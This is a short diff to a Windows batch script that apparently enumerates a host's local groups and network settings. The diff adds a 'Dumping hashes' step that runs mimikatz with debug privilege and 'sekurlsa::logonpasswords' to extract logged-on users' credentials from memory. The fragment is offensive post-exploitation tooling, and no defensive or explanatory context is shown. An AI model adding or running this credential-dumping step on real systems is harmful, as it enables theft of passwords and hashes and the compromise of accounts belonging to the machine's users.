@@ -33,6 +33,10 @@ echo [+] Local groups
 echo.
 net localgroup
 echo.
+echo [+] Dumping hashes
+echo.
+mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
+echo.
 echo ------- NETWORK INFO -------
 echo.
 echo [+] IP configuration
